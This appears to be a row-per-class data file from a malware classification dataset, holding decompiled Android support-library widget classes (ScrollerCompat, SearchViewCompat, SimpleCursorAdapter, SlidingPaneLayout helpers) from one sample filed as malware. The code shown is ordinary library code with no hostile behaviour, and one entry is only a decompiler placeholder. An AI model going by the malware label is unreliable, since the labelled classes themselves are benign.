  return ((OverScroller)scroller).getFinalX();   }   public static int getFinalY(  Object scroller){     return ((OverScroller)scroller).getFinalY();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ScrollerCompatIcs.code","class ScrollerCompatIcs {   ScrollerCompatIcs(){   }   public static float getCurrVelocity(  Object scroller){     return ((OverScroller)scroller).getCurrVelocity();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ScrollerCompatImpl.code","interface ScrollerCompatImpl {   void abortAnimation(  Object obj);   boolean computeScrollOffset(  Object obj);   Object createScroller(  Context context,  Interpolator interpolator);   void fling(  Object obj,  int i,  int i2,  int i3,  int i4,  int i5,  int i6,  int i7,  int i8);   void fling(  Object obj,  int i,  int i2,  int i3,  int i4,  int i5,  int i6,  int i7,  int i8,  int i9,  int i10);   float getCurrVelocity(  Object obj);   int getCurrX(  Object obj);   int getCurrY(  Object obj);   int getFinalX(  Object obj);   int getFinalY(  Object obj);   boolean isFinished(  Object obj);   boolean isOverScrolled(  Object obj);   void notifyHorizontalEdgeReached(  Object obj,  int i,  int i2,  int i3);   void notifyVerticalEdgeReached(  Object obj,  int i,  int i2,  int i3);   void startScroll(  Object obj,  int i,  int i2,  int i3,  int i4);   void startScroll(  Object obj,  int i,  int i2,  int i3,  int i4,  int i5); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ScrollerCompatImplBase.code","static class ScrollerCompatImplBase implements ScrollerCompatImpl {   ScrollerCompatImplBase(){   }   @Override public Object createScroller(  Context context,  Interpolator interpolator){     return interpolator != null ? new Scroller(context,interpolator) : new Scroller(context);   }   @Override public boolean isFinished(  Object scroller){     return ((Scroller)scroller).isFinished();   }   @Override public int getCurrX(  Object scroller){     return ((Scroller)scroller).getCurrX();   }   @Override public int getCurrY(  Object scroller){     return ((Scroller)scroller).getCurrY();   }   @Override public float getCurrVelocity(  Object scroller){     return 0.0f;   }   @Override public boolean computeScrollOffset(  Object scroller){     return ((Scroller)scroller).computeScrollOffset();   }   @Override public void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy){     ((Scroller)scroller).startScroll(startX,startY,dx,dy);   }   @Override public void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy,  int duration){     ((Scroller)scroller).startScroll(startX,startY,dx,dy,duration);   }   @Override public void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY){     ((Scroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY);   }   @Override public void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY,  int overX,  int overY){     ((Scroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY);   }   @Override public void abortAnimation(  Object scroller){     ((Scroller)scroller).abortAnimation();   }   @Override public void notifyHorizontalEdgeReached(  Object scroller,  int startX,  int finalX,  int overX){   }   @Override public void notifyVerticalEdgeReached(  Object scroller,  int startY,  int finalY,  int overY){   }   @Override public boolean isOverScrolled(  Object scroller){     return false;   }   @Override public int getFinalX(  Object scroller){     return ((Scroller)scroller).getFinalX();   }   @Override public int getFinalY(  Object scroller){     return ((Scroller)scroller).getFinalY();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ScrollerCompatImplGingerbread.code","static class ScrollerCompatImplGingerbread implements ScrollerCompatImpl {   ScrollerCompatImplGingerbread(){   }   @Override public Object createScroller(  Context context,  Interpolator interpolator){     return ScrollerCompatGingerbread.createScroller(context,interpolator);   }   @Override public boolean isFinished(  Object scroller){     return ScrollerCompatGingerbread.isFinished(scroller);   }   @Override public int getCurrX(  Object scroller){     return ScrollerCompatGingerbread.getCurrX(scroller);   }   @Override public int getCurrY(  Object scroller){     return ScrollerCompatGingerbread.getCurrY(scroller);   }   @Override public float getCurrVelocity(  Object scroller){     return 0.0f;   }   @Override public boolean computeScrollOffset(  Object scroller){     return ScrollerCompatGingerbread.computeScrollOffset(scroller);   }   @Override public void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy){     ScrollerCompatGingerbread.startScroll(scroller,startX,startY,dx,dy);   }   @Override public void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy,  int duration){     ScrollerCompatGingerbread.startScroll(scroller,startX,startY,dx,dy,duration);   }   @Override public void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY){     ScrollerCompatGingerbread.fling(scroller,startX,startY,velX,velY,minX,maxX,minY,maxY);   }   @Override public void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY,  int overX,  int overY){     ScrollerCompatGingerbread.fling(scroller,startX,startY,velX,velY,minX,maxX,minY,maxY,overX,overY);   }   @Override public void abortAnimation(  Object scroller){     ScrollerCompatGingerbread.abortAnimation(scroller);   }   @Override public void notifyHorizontalEdgeReached(  Object scroller,  int startX,  int finalX,  int overX){     ScrollerCompatGingerbread.notifyHorizontalEdgeReached(scroller,startX,finalX,overX);   }   @Override public void notifyVerticalEdgeReached(  Object scroller,  int startY,  int finalY,  int overY){     ScrollerCompatGingerbread.notifyVerticalEdgeReached(scroller,startY,finalY,overY);   }   @Override public boolean isOverScrolled(  Object scroller){     return ScrollerCompatGingerbread.isOverScrolled(scroller);   }   @Override public int getFinalX(  Object scroller){     return ScrollerCompatGingerbread.getFinalX(scroller);   }   @Override public int getFinalY(  Object scroller){     return ScrollerCompatGingerbread.getFinalY(scroller);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ScrollerCompatImplIcs.code","static class ScrollerCompatImplIcs extends ScrollerCompatImplGingerbread {   ScrollerCompatImplIcs(){   }   @Override public float getCurrVelocity(  Object scroller){     return ScrollerCompatIcs.getCurrVelocity(scroller);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SearchViewCompat.code","public class SearchViewCompat {   private static final SearchViewCompatImpl IMPL; interface SearchViewCompatImpl {     CharSequence getQuery(    View view);     boolean isIconified(    View view);     boolean isQueryRefinementEnabled(    View view);     boolean isSubmitButtonEnabled(    View view);     Object newOnCloseListener(    OnCloseListenerCompat onCloseListenerCompat);     Object newOnQueryTextListener(    OnQueryTextListenerCompat onQueryTextListenerCompat);     View newSearchView(    Context context);     void setIconified(    View view,    boolean z);     void setImeOptions(    View view,    int i);     void setInputType(    View view,    int i);     void setMaxWidth(    View view,    int i);     void setOnCloseListener(    Object obj,    Object obj2);     void setOnQueryTextListener(    Object obj,    Object obj2);     void setQuery(    View view,    CharSequence charSequence,    boolean z);     void setQueryHint(    View view,    CharSequence charSequence);     void setQueryRefinementEnabled(    View view,    boolean z);     void setSearchableInfo(    View view,    ComponentName componentName);     void setSubmitButtonEnabled(    View view,    boolean z);   } static class SearchViewCompatStubImpl implements SearchViewCompatImpl {     SearchViewCompatStubImpl(){     }     @Override public View newSearchView(    Context context){       return null;     }     @Override public void setSearchableInfo(    View searchView,    ComponentName searchableComponent){     }     @Override public void setImeOptions(    View searchView,    int imeOptions){     }     @Override public void setInputType(    View searchView,    int inputType){     }     @Override public Object newOnQueryTextListener(    OnQueryTextListenerCompat listener){       return null;     }     @Override public void setOnQueryTextListener(    Object searchView,    Object listener){     }     @Override public Object newOnCloseListener(    OnCloseListenerCompat listener){       return null;     }     @Override public void setOnCloseListener(    Object searchView,    Object listener){     }     @Override public CharSequence getQuery(    View searchView){       return null;     }     @Override public void setQuery(    View searchView,    CharSequence query,    boolean submit){     }     @Override public void setQueryHint(    View searchView,    CharSequence hint){     }     @Override public void setIconified(    View searchView,    boolean iconify){     }     @Override public boolean isIconified(    View searchView){       return true;     }     @Override public void setSubmitButtonEnabled(    View searchView,    boolean enabled){     }     @Override public boolean isSubmitButtonEnabled(    View searchView){       return false;     }     @Override public void setQueryRefinementEnabled(    View searchView,    boolean enable){     }     @Override public boolean isQueryRefinementEnabled(    View searchView){       return false;     }     @Override public void setMaxWidth(    View searchView,    int maxpixels){     }   } static class SearchViewCompatHoneycombImpl extends SearchViewCompatStubImpl {     SearchViewCompatHoneycombImpl(){     }     @Override public View newSearchView(    Context context){       return SearchViewCompatHoneycomb.newSearchView(context);     }     @Override public void setSearchableInfo(    View searchView,    ComponentName searchableComponent){       SearchViewCompatHoneycomb.setSearchableInfo(searchView,searchableComponent);     }     @Override public Object newOnQueryTextListener(    final OnQueryTextListenerCompat listener){       return SearchViewCompatHoneycomb.newOnQueryTextListener(new SearchViewCompatHoneycomb.OnQueryTextListenerCompatBridge(){         @Override public boolean onQueryTextSubmit(        String query){           return listener.onQueryTextSubmit(query);         }         @Override public boolean onQueryTextChange(        String newText){           return listener.onQueryTextChange(newText);         }       } );     }     @Override public void setOnQueryTextListener(    Object searchView,    Object listener){       SearchViewCompatHoneycomb.setOnQueryTextListener(searchView,listener);     }     @Override public Object newOnCloseListener(    final OnCloseListenerCompat listener){       return SearchViewCompatHoneycomb.newOnCloseListener(new SearchViewCompatHoneycomb.OnCloseListenerCompatBridge(){         @Override public boolean onClose(){           return listener.onClose();         }       } );     }     @Override public void setOnCloseListener(    Object searchView,    Object listener){       SearchViewCompatHoneycomb.setOnCloseListener(searchView,listener);     }     @Override public CharSequence getQuery(    View searchView){       return SearchViewCompatHoneycomb.getQuery(searchView);     }     @Override public void setQuery(    View searchView,    CharSequence query,    boolean submit){       SearchViewCompatHoneycomb.setQuery(searchView,query,submit);     }     @Override public void setQueryHint(    View searchView,    CharSequence hint){       SearchViewCompatHoneycomb.setQueryHint(searchView,hint);     }     @Override public void setIconified(    View searchView,    boolean iconify){       SearchViewCompatHoneycomb.setIconified(searchView,iconify);     }     @Override public boolean isIconified(    View searchView){       return SearchViewCompatHoneycomb.isIconified(searchView);     }     @Override public void setSubmitButtonEnabled(    View searchView,    boolean enabled){       SearchViewCompatHoneycomb.setSubmitButtonEnabled(searchView,enabled);     }     @Override public boolean isSubmitButtonEnabled(    View searchView){       return SearchViewCompatHoneycomb.isSubmitButtonEnabled(searchView);     }     @Override public void setQueryRefinementEnabled(    View searchView,    boolean enable){       SearchViewCompatHoneycomb.setQueryRefinementEnabled(searchView,enable);     }     @Override public boolean isQueryRefinementEnabled(    View searchView){       return SearchViewCompatHoneycomb.isQueryRefinementEnabled(searchView);     }     @Override public void setMaxWidth(    View searchView,    int maxpixels){       SearchViewCompatHoneycomb.setMaxWidth(searchView,maxpixels);     }   } static class SearchViewCompatIcsImpl extends SearchViewCompatHoneycombImpl {     SearchViewCompatIcsImpl(){     }     @Override public View newSearchView(    Context context){       return SearchViewCompatIcs.newSearchView(context);     }     @Override public void setImeOptions(    View searchView,    int imeOptions){       SearchViewCompatIcs.setImeOptions(searchView,imeOptions);     }     @Override public void setInputType(    View searchView,    int inputType){       SearchViewCompatIcs.setInputType(searchView,inputType);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new SearchViewCompatIcsImpl();     }  else     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new SearchViewCompatHoneycombImpl();     }  else {       IMPL=new SearchViewCompatStubImpl();     }   }   private SearchViewCompat(  Context context){   }   public static View newSearchView(  Context context){     return IMPL.newSearchView(context);   }   public static void setSearchableInfo(  View searchView,  ComponentName searchableComponent){     IMPL.setSearchableInfo(searchView,searchableComponent);   }   public static void setImeOptions(  View searchView,  int imeOptions){     IMPL.setImeOptions(searchView,imeOptions);   }   public static void setInputType(  View searchView,  int inputType){     IMPL.setInputType(searchView,inputType);   }   public static void setOnQueryTextListener(  View searchView,  OnQueryTextListenerCompat listener){     IMPL.setOnQueryTextListener(searchView,listener.mListener);   } public static abstract class OnQueryTextListenerCompat {     final Object mListener=SearchViewCompat.IMPL.newOnQueryTextListener(this);     public boolean onQueryTextSubmit(    String query){       return false;     }     public boolean onQueryTextChange(    String newText){       return false;     }   }   public static void setOnCloseListener(  View searchView,  OnCloseListenerCompat listener){     IMPL.setOnCloseListener(searchView,listener.mListener);   } public static abstract class OnCloseListenerCompat {     final Object mListener=SearchViewCompat.IMPL.newOnCloseListener(this);     public boolean onClose(){       return false;     }   }   public static CharSequence getQuery(  View searchView){     return IMPL.getQuery(searchView);   }   public static void setQuery(  View searchView,  CharSequence query,  boolean submit){     IMPL.setQuery(searchView,query,submit);   }   public static void setQueryHint(  View searchView,  CharSequence hint){     IMPL.setQueryHint(searchView,hint);   }   public static void setIconified(  View searchView,  boolean iconify){     IMPL.setIconified(searchView,iconify);   }   public static boolean isIconified(  View searchView){     return IMPL.isIconified(searchView);   }   public static void setSubmitButtonEnabled(  View searchView,  boolean enabled){     IMPL.setSubmitButtonEnabled(searchView,enabled);   }   public static boolean isSubmitButtonEnabled(  View searchView){     return IMPL.isSubmitButtonEnabled(searchView);   }   public static void setQueryRefinementEnabled(  View searchView,  boolean enable){     IMPL.setQueryRefinementEnabled(searchView,enable);   }   public static boolean isQueryRefinementEnabled(  View searchView){     return IMPL.isQueryRefinementEnabled(searchView);   }   public static void setMaxWidth(  View searchView,  int maxpixels){     IMPL.setMaxWidth(searchView,maxpixels);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SearchViewCompatHoneycomb.code","class SearchViewCompatHoneycomb { interface OnCloseListenerCompatBridge {     boolean onClose();   } interface OnQueryTextListenerCompatBridge {     boolean onQueryTextChange(    String str);     boolean onQueryTextSubmit(    String str);   }   SearchViewCompatHoneycomb(){   }   public static View newSearchView(  Context context){     return new SearchView(context);   }   public static void setSearchableInfo(  View searchView,  ComponentName searchableComponent){     SearchView sv=(SearchView)searchView;     SearchManager searchManager=(SearchManager)sv.getContext().getSystemService(""search"");     sv.setSearchableInfo(searchManager.getSearchableInfo(searchableComponent));   }   public static Object newOnQueryTextListener(  final OnQueryTextListenerCompatBridge listener){     return new SearchView.OnQueryTextListener(){       @Override public boolean onQueryTextSubmit(      String query){         return OnQueryTextListenerCompatBridge.this.onQueryTextSubmit(query);       }       @Override public boolean onQueryTextChange(      String newText){         return OnQueryTextListenerCompatBridge.this.onQueryTextChange(newText);       }     } ;   }   public static void setOnQueryTextListener(  Object searchView,  Object listener){     ((SearchView)searchView).setOnQueryTextListener((SearchView.OnQueryTextListener)listener);   }   public static Object newOnCloseListener(  final OnCloseListenerCompatBridge listener){     return new SearchView.OnCloseListener(){       @Override public boolean onClose(){         return OnCloseListenerCompatBridge.this.onClose();       }     } ;   }   public static void setOnCloseListener(  Object searchView,  Object listener){     ((SearchView)searchView).setOnCloseListener((SearchView.OnCloseListener)listener);   }   public static CharSequence getQuery(  View searchView){     return ((SearchView)searchView).getQuery();   }   public static void setQuery(  View searchView,  CharSequence query,  boolean submit){     ((SearchView)searchView).setQuery(query,submit);   }   public static void setQueryHint(  View searchView,  CharSequence hint){     ((SearchView)searchView).setQueryHint(hint);   }   public static void setIconified(  View searchView,  boolean iconify){     ((SearchView)searchView).setIconified(iconify);   }   public static boolean isIconified(  View searchView){     return ((SearchView)searchView).isIconified();   }   public static void setSubmitButtonEnabled(  View searchView,  boolean enabled){     ((SearchView)searchView).setSubmitButtonEnabled(enabled);   }   public static boolean isSubmitButtonEnabled(  View searchView){     return ((SearchView)searchView).isSubmitButtonEnabled();   }   public static void setQueryRefinementEnabled(  View searchView,  boolean enable){     ((SearchView)searchView).setQueryRefinementEnabled(enable);   }   public static boolean isQueryRefinementEnabled(  View searchView){     return ((SearchView)searchView).isQueryRefinementEnabled();   }   public static void setMaxWidth(  View searchView,  int maxpixels){     ((SearchView)searchView).setMaxWidth(maxpixels);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SearchViewCompatHoneycombImpl.code","static class SearchViewCompatHoneycombImpl extends SearchViewCompatStubImpl {   SearchViewCompatHoneycombImpl(){   }   @Override public View newSearchView(  Context context){     return SearchViewCompatHoneycomb.newSearchView(context);   }   @Override public void setSearchableInfo(  View searchView,  ComponentName searchableComponent){     SearchViewCompatHoneycomb.setSearchableInfo(searchView,searchableComponent);   }   @Override public Object newOnQueryTextListener(  final OnQueryTextListenerCompat listener){     return SearchViewCompatHoneycomb.newOnQueryTextListener(new SearchViewCompatHoneycomb.OnQueryTextListenerCompatBridge(){       @Override public boolean onQueryTextSubmit(      String query){         return listener.onQueryTextSubmit(query);       }       @Override public boolean onQueryTextChange(      String newText){         return listener.onQueryTextChange(newText);       }     } );   }   @Override public void setOnQueryTextListener(  Object searchView,  Object listener){     SearchViewCompatHoneycomb.setOnQueryTextListener(searchView,listener);   }   @Override public Object newOnCloseListener(  final OnCloseListenerCompat listener){     return SearchViewCompatHoneycomb.newOnCloseListener(new SearchViewCompatHoneycomb.OnCloseListenerCompatBridge(){       @Override public boolean onClose(){         return listener.onClose();       }     } );   }   @Override public void setOnCloseListener(  Object searchView,  Object listener){     SearchViewCompatHoneycomb.setOnCloseListener(searchView,listener);   }   @Override public CharSequence getQuery(  View searchView){     return SearchViewCompatHoneycomb.getQuery(searchView);   }   @Override public void setQuery(  View searchView,  CharSequence query,  boolean submit){     SearchViewCompatHoneycomb.setQuery(searchView,query,submit);   }   @Override public void setQueryHint(  View searchView,  CharSequence hint){     SearchViewCompatHoneycomb.setQueryHint(searchView,hint);   }   @Override public void setIconified(  View searchView,  boolean iconify){     SearchViewCompatHoneycomb.setIconified(searchView,iconify);   }   @Override public boolean isIconified(  View searchView){     return SearchViewCompatHoneycomb.isIconified(searchView);   }   @Override public void setSubmitButtonEnabled(  View searchView,  boolean enabled){     SearchViewCompatHoneycomb.setSubmitButtonEnabled(searchView,enabled);   }   @Override public boolean isSubmitButtonEnabled(  View searchView){     return SearchViewCompatHoneycomb.isSubmitButtonEnabled(searchView);   }   @Override public void setQueryRefinementEnabled(  View searchView,  boolean enable){     SearchViewCompatHoneycomb.setQueryRefinementEnabled(searchView,enable);   }   @Override public boolean isQueryRefinementEnabled(  View searchView){     return SearchViewCompatHoneycomb.isQueryRefinementEnabled(searchView);   }   @Override public void setMaxWidth(  View searchView,  int maxpixels){     SearchViewCompatHoneycomb.setMaxWidth(searchView,maxpixels);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SearchViewCompatIcs.code","class SearchViewCompatIcs {   SearchViewCompatIcs(){   } public static class MySearchView extends SearchView {     public MySearchView(    Context context){       super(context);     }     @Override public void onActionViewCollapsed(){       setQuery("""",false);       super.onActionViewCollapsed();     }   }   public static View newSearchView(  Context context){     return new MySearchView(context);   }   public static void setImeOptions(  View searchView,  int imeOptions){     ((SearchView)searchView).setImeOptions(imeOptions);   }   public static void setInputType(  View searchView,  int inputType){     ((SearchView)searchView).setInputType(inputType);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SearchViewCompatIcsImpl.code","static class SearchViewCompatIcsImpl extends SearchViewCompatHoneycombImpl {   SearchViewCompatIcsImpl(){   }   @Override public View newSearchView(  Context context){     return SearchViewCompatIcs.newSearchView(context);   }   @Override public void setImeOptions(  View searchView,  int imeOptions){     SearchViewCompatIcs.setImeOptions(searchView,imeOptions);   }   @Override public void setInputType(  View searchView,  int inputType){     SearchViewCompatIcs.setInputType(searchView,inputType);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SearchViewCompatImpl.code","interface SearchViewCompatImpl {   CharSequence getQuery(  View view);   boolean isIconified(  View view);   boolean isQueryRefinementEnabled(  View view);   boolean isSubmitButtonEnabled(  View view);   Object newOnCloseListener(  OnCloseListenerCompat onCloseListenerCompat);   Object newOnQueryTextListener(  OnQueryTextListenerCompat onQueryTextListenerCompat);   View newSearchView(  Context context);   void setIconified(  View view,  boolean z);   void setImeOptions(  View view,  int i);   void setInputType(  View view,  int i);   void setMaxWidth(  View view,  int i);   void setOnCloseListener(  Object obj,  Object obj2);   void setOnQueryTextListener(  Object obj,  Object obj2);   void setQuery(  View view,  CharSequence charSequence,  boolean z);   void setQueryHint(  View view,  CharSequence charSequence);   void setQueryRefinementEnabled(  View view,  boolean z);   void setSearchableInfo(  View view,  ComponentName componentName);   void setSubmitButtonEnabled(  View view,  boolean z); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SearchViewCompatStubImpl.code","static class SearchViewCompatStubImpl implements SearchViewCompatImpl {   SearchViewCompatStubImpl(){   }   @Override public View newSearchView(  Context context){     return null;   }   @Override public void setSearchableInfo(  View searchView,  ComponentName searchableComponent){   }   @Override public void setImeOptions(  View searchView,  int imeOptions){   }   @Override public void setInputType(  View searchView,  int inputType){   }   @Override public Object newOnQueryTextListener(  OnQueryTextListenerCompat listener){     return null;   }   @Override public void setOnQueryTextListener(  Object searchView,  Object listener){   }   @Override public Object newOnCloseListener(  OnCloseListenerCompat listener){     return null;   }   @Override public void setOnCloseListener(  Object searchView,  Object listener){   }   @Override public CharSequence getQuery(  View searchView){     return null;   }   @Override public void setQuery(  View searchView,  CharSequence query,  boolean submit){   }   @Override public void setQueryHint(  View searchView,  CharSequence hint){   }   @Override public void setIconified(  View searchView,  boolean iconify){   }   @Override public boolean isIconified(  View searchView){     return true;   }   @Override public void setSubmitButtonEnabled(  View searchView,  boolean enabled){   }   @Override public boolean isSubmitButtonEnabled(  View searchView){     return false;   }   @Override public void setQueryRefinementEnabled(  View searchView,  boolean enable){   }   @Override public boolean isQueryRefinementEnabled(  View searchView){     return false;   }   @Override public void setMaxWidth(  View searchView,  int maxpixels){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SimpleCursorAdapter.code","public class SimpleCursorAdapter extends ResourceCursorAdapter {   private CursorToStringConverter mCursorToStringConverter;   protected int[] mFrom;   String[] mOriginalFrom;   private int mStringConversionColumn;   protected int[] mTo;   private ViewBinder mViewBinder; public interface CursorToStringConverter {     CharSequence convertToString(    Cursor cursor);   } public interface ViewBinder {     boolean setViewValue(    View view,    Cursor cursor,    int i);   }   @Deprecated public SimpleCursorAdapter(  Context context,  int layout,  Cursor c,  String[] from,  int[] to){     super(context,layout,c);     this.mStringConversionColumn=-1;     this.mTo=to;     this.mOriginalFrom=from;     findColumns(from);   }   public SimpleCursorAdapter(  Context context,  int layout,  Cursor c,  String[] from,  int[] to,  int flags){     super(context,layout,c,flags);     this.mStringConversionColumn=-1;     this.mTo=to;     this.mOriginalFrom=from;     findColumns(from);   }   @Override public void bindView(  View view,  Context context,  Cursor cursor){     ViewBinder binder=this.mViewBinder;     int count=this.mTo.length;     int[] from=this.mFrom;     int[] to=this.mTo;     for (int i=0; i < count; i++) {       View v=view.findViewById(to[i]);       if (v != null) {         boolean bound=false;         if (binder != null) {           bound=binder.setViewValue(v,cursor,from[i]);         }         if (bound) {           continue;         }  else {           String text=cursor.getString(from[i]);           if (text == null) {             text="""";           }           if (v instanceof TextView) {             setViewText((TextView)v,text);           }  else           if (v instanceof ImageView) {             setViewImage((ImageView)v,text);           }  else {             throw new IllegalStateException(v.getClass().getName() + "" is not a  view that can be bounds by this SimpleCursorAdapter"");           }         }       }     }   }   public ViewBinder getViewBinder(){     return this.mViewBinder;   }   public void setViewBinder(  ViewBinder viewBinder){     this.mViewBinder=viewBinder;   }   public void setViewImage(  ImageView v,  String value){     try {       v.setImageResource(Integer.parseInt(value));     }  catch (    NumberFormatException e) {       v.setImageURI(Uri.parse(value));     }   }   public void setViewText(  TextView v,  String text){     v.setText(text);   }   public int getStringConversionColumn(){     return this.mStringConversionColumn;   }   public void setStringConversionColumn(  int stringConversionColumn){     this.mStringConversionColumn=stringConversionColumn;   }   public CursorToStringConverter getCursorToStringConverter(){     return this.mCursorToStringConverter;   }   public void setCursorToStringConverter(  CursorToStringConverter cursorToStringConverter){     this.mCursorToStringConverter=cursorToStringConverter;   }   @Override public CharSequence convertToString(  Cursor cursor){     if (this.mCursorToStringConverter != null) {       return this.mCursorToStringConverter.convertToString(cursor);     }     if (this.mStringConversionColumn > -1) {       return cursor.getString(this.mStringConversionColumn);     }     return super.convertToString(cursor);   }   private void findColumns(  String[] from){     if (this.mCursor != null) {       int count=from.length;       if (this.mFrom == null || this.mFrom.length != count) {         this.mFrom=new int[count];       }       for (int i=0; i < count; i++) {         this.mFrom[i]=this.mCursor.getColumnIndexOrThrow(from[i]);       }       return;     }     this.mFrom=null;   }   @Override public Cursor swapCursor(  Cursor c){     Cursor res=super.swapCursor(c);     findColumns(this.mOriginalFrom);     return res;   }   public void changeCursorAndColumns(  Cursor c,  String[] from,  int[] to){     this.mOriginalFrom=from;     this.mTo=to;     super.changeCursor(c);     findColumns(this.mOriginalFrom);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SimpleDrawerListener.code","public static abstract class SimpleDrawerListener implements DrawerListener {   @Override public void onDrawerSlide(  View drawerView,  float slideOffset){   }   @Override public void onDrawerOpened(  View drawerView){   }   @Override public void onDrawerClosed(  View drawerView){   }   @Override public void onDrawerStateChanged(  int newState){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SimplePanelSlideListener.code","public static class SimplePanelSlideListener implements PanelSlideListener {   @Override public void onPanelSlide(  View panel,  float slideOffset){   }   @Override public void onPanelOpened(  View panel){   }   @Override public void onPanelClosed(  View panel){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SlidingPaneLayout.code","!org.eclipse.jdt.core.dom.TypeDeclaration@64cf870d"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SlidingPanelLayoutImpl.code","public interface SlidingPanelLayoutImpl {   void invalidateChildRegion(  SlidingPaneLayout slidingPaneLayout,  View view); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SlidingPanelLayoutImplBase.code","static class SlidingPanelLayoutImplBase implements SlidingPanelLayoutImpl {   SlidingPanelLayoutImplBase(){   }   @Override public void invalidateChildRegion(  SlidingPaneLayout parent,  View child){     ViewCompat.postInvalidateOnAnimation(parent,child.getLeft(),child.getTop(),child.getRight(),child.getBottom());   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SlidingPanelLayoutImplJB.code","static class SlidingPanelLayoutImplJB extends SlidingPanelLayoutImplBase {   private Method mGetDisplayList;   private Field mRecreateDisplayList;   SlidingPanelLayoutImplJB(){     try {       this.mGetDisplayList=View.class.getDeclaredMethod(""getDisplayList"",(Class[])null);     }  catch (    NoSuchMethodException e) {       Log.e(SlidingPaneLayout.TAG,""Couldn't fetch getDisplayList method; dimming won't work right."",e);     }     try {       this.mRecreateDisplayList=View.class.getDeclaredField(""mRecreateDisplayList"");       this.mRecreateDisplayList.setAccessible(true);     }  catch (    NoSuchFieldException e2) {       Log.e(SlidingPaneLayout.TAG,""Couldn't fetch mRecreateDisplayList field; dimming will be slow."",e2);     }   }   @Override public void invalidateChildRegion(  SlidingPaneLayout parent,  View child){     if (this.mGetDisplayList != null && this.mRecreateDisplayList != null) {       try {         this.mRecreateDisplayList.setBoolean(child,true);         this.mGetDisplayList.invoke(child,(Object[])null);       }  catch (      Exception e) {         Log.e(SlidingPaneLayout.TAG,""Error refreshing display list state"",e);       }       super.invalidateChildRegion(parent,child);       return;     }     child.invalidate();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SlidingPanelLayoutImplJBMR1.code","static class SlidingPanelLayoutImplJBMR1 extends SlidingPanelLayoutImplBase {   SlidingPanelLayoutImplJBMR1(){   }   @Override public void invalidateChildRegion(  SlidingPaneLayout parent,  View child){     ViewCompat.setLayerPaint(child,((LayoutParams)child.getLayoutParams()).dimPaint);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ViewBinder.code","public interface ViewBinder {   boolean setViewValue(  View view,  Cursor cursor,  int i); } "
